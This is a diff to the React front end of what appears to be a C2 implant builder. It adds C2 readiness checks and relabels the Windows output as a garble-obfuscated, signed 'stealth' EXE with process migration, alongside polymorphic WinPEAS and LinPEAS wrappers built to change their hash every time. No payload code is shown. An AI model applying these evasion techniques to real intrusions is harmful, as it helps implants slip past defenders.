@@ -482,6 +482,8 @@ const ImplantBuilder = () => {
   const [linpeasAvailable, setLinpeasAvailable] = useState(true);
   const [linpeasAutoFetch, setLinpeasAutoFetch] = useState(true);
   const [linpeasFetching, setLinpeasFetching] = useState(false);
+  const [c2Issues, setC2Issues] = useState([]);
+  const [tcpListenPort, setTcpListenPort] = useState(null);
 
   const loadDefaults = useCallback(async () => {
     try {
@@ -499,6 +501,14 @@ const ImplantBuilder = () => {
       }
       if (typeof res.data?.linpeasAutoFetch === 'boolean') {
         setLinpeasAutoFetch(res.data.linpeasAutoFetch);
+      }
+      if (res.data?.tcpListenPort) setTcpListenPort(res.data.tcpListenPort);
+      try {
+        const diag = await axios.get('/api/builder/c2-diagnostics', { headers: authHeaders() });
+        setC2Issues(diag.data?.issues || []);
+        if (diag.data?.tcpListen?.port) setTcpListenPort(diag.data.tcpListen.port);
+      } catch (_) {
+        setC2Issues([]);
       }
     } catch (e) {
       /* keep defaults */
@@ -781,10 +791,28 @@ const ImplantBuilder = () => {
                 ? 'Generate a polymorphic WinPEAS batch file: gzip payload, random chunked variables, PowerShell decode stub, build stamp — new sha256 every time.'
               : isLinpeas
                 ? 'Generate a polymorphic LinPEAS script: gzip payload, random chunked base64 wrapper, build stamp, and tail entropy — new sha256 every time.'
-                : 'Build a fresh Windows or Linux binary from lastfinalversion2.go. Every generation rotates XOR keys, shift, strings, and padding so the signature changes.'}
+                : platform === 'windows'
+                  ? 'Single signed EXE: garble obfuscation, per-build XOR/shift, random persistence names, embedded migrate DLL only (no sidecar files). Each build gets a new hash.'
+                  : 'Build a fresh Linux binary from lastfinalversion2.go. Every generation rotates XOR keys, shift, and strings.'}
           </p>
         </div>
       </Head>
+
+      {c2Issues.length > 0 && (
+        <Note style={{ marginBottom: 16, color: '#ff8a8a', borderColor: '#a44' }}>
+          <strong>C2 not ready for implants:</strong>
+          <ul style={{ margin: '8px 0 0', paddingLeft: 18 }}>
+            {c2Issues.map((msg) => (
+              <li key={msg}>{msg}</li>
+            ))}
+          </ul>
+          {tcpListenPort ? (
+            <div style={{ marginTop: 8 }}>
+              Teamserver implant TCP port: <code>{tcpListenPort}</code> — firewall must allow inbound TCP here.
+            </div>
+          ) : null}
+        </Note>
+      )}
 
       <Grid>
         <div>
@@ -817,7 +845,7 @@ const ImplantBuilder = () => {
                 onClick={() => setWindowsVariant('implant')}
                 disabled={busy}
               >
-                C2 implant (Go)
+                Stealth implant (single EXE)
               </SubVariantBtn>
               <SubVariantBtn
                 type="button"
@@ -874,16 +902,6 @@ const ImplantBuilder = () => {
               <option value="arm64">arm64</option>
             </Select>
           </Field>
-
-          {platform === 'windows' && !isDcom && !isWinpeas && (
-            <Field>
-              Output format
-              <Select value={format} onChange={(e) => setFormat(e.target.value)}>
-                <option value="exe">EXE + embedded inject DLL (recommended)</option>
-                <option value="dll">DLL only (for injectdll path)</option>
-              </Select>
-            </Field>
-          )}
 
           {!isScriptOnly && (
             <>
@@ -977,9 +995,7 @@ const ImplantBuilder = () => {
                 : isLinpeas
                   ? 'Generate LinPEAS script'
                   : platform === 'windows'
-                    ? format === 'dll'
-                      ? 'Generate Windows DLL'
-                      : 'Generate Windows EXE (+ inject DLL)'
+                    ? 'Generate stealth EXE'
                     : 'Generate Linux binary'}
           </GenerateBtn>
 
@@ -1028,12 +1044,14 @@ const ImplantBuilder = () => {
               <code>chmod +x file.sh &amp;&amp; ./file.sh</code> (same LinPEAS flags: <code>-a</code>, <code>-s</code>, etc.).
               Authorized testing only.
             </Note>
-          ) : platform === 'windows' ? (
+          ) : platform === 'windows' && windowsVariant === 'implant' ? (
             <Note>
-              Windows EXE builds embed a real inject DLL. After you connect, run{' '}
-              <code>migrate &lt;pid&gt;</code> — the session then lives inside that process
-              (kill the host PID to kill the session). Do not inject an .exe path.
+              One download: garble-compiled stealth EXE (migrate DLL embedded only). Teamserver needs{' '}
+              <code>garble</code> (<code>go install mvdan.cc/garble@v0.16.0</code>). After connect,{' '}
+              <code>migrate &lt;pid&gt;</code> uses the packed DLL inside the EXE. Authorized testing only.
             </Note>
+          ) : platform === 'windows' ? (
+            <Note>DCOM / WinPEAS builds are separate tools — not the C2 stealth implant.</Note>
           ) : (
             <Note>
               Linux implant connects to your C2 with the same polymorphic Go build as Windows (no DLL pack).
@@ -1068,6 +1086,7 @@ const ImplantBuilder = () => {
                       {b.variant === 'dcom' || b.tool === 'go-dcom' ? ' · go-dcom' : ''}
                       {b.variant === 'linpeas' || b.tool === 'linpeas-sh' ? ' · linpeas-sh' : ''}
                       {b.variant === 'winpeas' || b.tool === 'winpeas-bat' ? ' · winpeas-bat' : ''}
+                      {b.tool === 'garble-stealth' || b.variant === 'stealth' ? ' · stealth' : ''}
                       {b.format ? `/${b.format}` : ''}
                       {b.injectDllPacked ? ' · migrate-ready' : ''}
                       {b.authenticodeSigned ? ` · signed${b.signPublisher ? ` (${b.signPublisher.split(',')[0].replace('CN=', '')})` : ''}` : ''}
